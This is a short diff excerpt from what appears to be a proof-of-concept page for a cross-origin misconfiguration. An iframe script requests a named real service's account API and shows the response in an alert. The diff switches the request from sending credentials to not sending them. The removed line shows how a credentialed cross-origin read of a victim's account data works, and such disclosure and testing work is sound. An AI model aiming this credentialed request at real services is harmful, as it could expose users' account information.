@@ -8,7 +8,8 @@
           alert('Response from vulnerable API:\\n\\n' + this.responseText);
         };
         req.open('GET', 'https://login.devolutions.com/api/v1/account', true);
-        req.withCredentials = true;
+        req.withCredentials = false;
+
         req.send();
       <\/script>
     "></iframe>
